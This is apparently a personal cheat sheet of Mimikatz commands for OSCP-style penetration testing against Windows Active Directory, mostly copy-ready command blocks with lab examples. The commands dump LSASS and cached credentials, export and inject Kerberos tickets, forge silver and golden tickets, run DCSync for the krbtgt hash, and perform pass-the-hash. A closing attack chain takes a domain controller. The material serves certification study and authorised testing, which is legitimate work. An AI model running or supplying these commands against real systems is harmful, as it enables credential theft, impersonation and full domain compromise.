# Mimikatz Cheat Sheet (OSCP+ Focused)

## Setup

Run from an **elevated** prompt on a domain-joined Windows machine (cmd or PowerShell):

```cmd
privilege::debug
token::elevate
```

> As stated above, this requires administrator privileges. 

> Mimikatz cannot be used (as far as I'm aware) on `evil-winrm`

---

## 1. Dump Credentials from LSASS (Memory)

### Basic Dump

```mimikatz
sekurlsa::logonpasswords
```

Lists credentials currently in memory — including:

- NTLM hashes
    
- Clear-text passwords (if cached)
    
- Kerberos TGT info
    

When you come across a valid username & NTLM hash, first, attempt to crack it with hashcat. If you are unable to crack, use `evil-winrm` to perform a PtH attack and move laterally/vertically on the network to another host.

---

## 2. Dump Cached Kerberos Tickets

```mimikatz
kerberos::list
```

Extract `.kirbi` ticket files:

```mimikatz
kerberos::list /export
```

---

## 3. Inject a Ticket (Pass-the-Ticket / PTT)

Load `.kirbi` ticket into memory:

```mimikatz
kerberos::ptt ticket.kirbi
```

Confirm with:

```cmd
klist
```

> Use `.kirbi` files harvested from Rubeus or Mimikatz itself.

---

## 4. Silver Ticket Creation

### Prerequisites

- NTLM hash of service account
    
- Domain name, SID
    
- Service SPN (e.g., HTTP/web01.htb.local)
    

```mimikatz
kerberos::golden /user:<username> /domain:<domain> /sid:<domain-SID> /rc4:<NTLM-hash> /service:<service> /target:<FQDN> /ptt
```

**Example:**

```mimikatz
kerberos::golden /user:websvc /domain:htb.local /sid:S-1-5-21-123456789-321654987-456987123 /rc4:9f4b4f9bffe88542acb6ea30e51b1a23 /service:HTTP /target:web01.htb.local /ptt
```

---

## 5. Golden Ticket Creation

### Prerequisites

- NTLM hash of **krbtgt**
    
- Domain SID
    
- Domain name
    

```mimikatz
kerberos::golden /user:<admin-user> /domain:<domain> /sid:<SID> /krbtgt:<krbtgt-hash> /ptt
```

**Example:**

```mimikatz
kerberos::golden /user:administrator /domain:htb.local /sid:S-1-5-21-123456789-321654987-456987123 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
```

---

## 6. DCSync Attack (Dump Hashes Without Touching LSASS)

### Dump Administrator Hash

```mimikatz
lsadump::dcsync /domain:htb.local /user:administrator
```

### Dump `krbtgt` Hash (for Golden Ticket)

```mimikatz
lsadump::dcsync /domain:htb.local /user:krbtgt
```

> Requires **Replicating Directory Changes** privilege

---

## 7. LSA Secrets (Service Account & System Info Dump)

```mimikatz
lsadump::secrets
```

Useful to extract:

- Service account credentials
    
- Saved RDP credentials
    
- Cached scheduled task passwords
    

---

## 8. Extract Domain Cached Credentials (DCC)

```mimikatz
lsadump::cache
```

These are useful for offline cracking using hashcat mode `2100`.

---

## 9. Pass-the-Hash (PTH) via Token Replacement

Create a token and run a command with impersonated credentials:

```mimikatz
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe
```

**Example:**

```mimikatz
sekurlsa::pth /user:svc_sql /domain:htb.local /ntlm:ccf749a1e26e51b6e07ed92d6d68f762 /run:cmd.exe
```

---

## 10. Token Impersonation

List tokens:

```mimikatz
token::list
```

Impersonate SYSTEM token:

```mimikatz
token::elevate
```

Impersonate another user token (from token list):

```mimikatz
token::impersonate <token_id>
```

---

## 11. Dump All Data in One Shot (Interactive)

```mimikatz
log
privilege::debug
sekurlsa::logonpasswords
lsadump::dcsync /user:krbtgt
kerberos::list /export
```

---

## 12. Export Tickets for Offline Analysis

```mimikatz
kerberos::list /export
```

Move `.kirbi` files for re-use via `kerberos::ptt` or `Rubeus tgtdeleg`

---
## Mimikatz Usage Flow Examples

### Full Golden Ticket Attack Chain

```powershell
# From SYSTEM shell on domain-joined box:
privilege::debug
lsadump::dcsync /domain:htb.local /user:krbtgt
kerberos::golden /user:admin /domain:htb.local /sid:S-1-5-21-xxx /krbtgt:<hash> /ptt
klist
PsExec.exe \\dc01 cmd.exe
```

---

## Summary: Common Use Cases

|Objective|Command|
|---|---|
|Dump LSASS creds|`sekurlsa::logonpasswords`|
|Extract krbtgt hash|`lsadump::dcsync /user:krbtgt`|
|Create Golden Ticket|`kerberos::golden /krbtgt:<hash> /ptt`|
|Create Silver Ticket|`kerberos::golden /rc4:<hash> /service:<svc>`|
|PTT any `.kirbi` ticket|`kerberos::ptt <ticket.kirbi>`|
|List current tickets|`kerberos::list`|
|Dump LSA secrets|`lsadump::secrets`|
|Impersonate token|`token::impersonate <id>`|

---

## References

- [Mimikatz GitHub (gentilkiwi)](https://github.com/gentilkiwi/mimikatz)
    
- [ADSecurity: Golden Ticket](https://adsecurity.org/?p=1640)
    
- [Mimikatz Module Reference](https://blog.gentilkiwi.com/mimikatz)
    
- [SpecterOps Kerberos Series](https://posts.specterops.io/tagged/kerberos)
    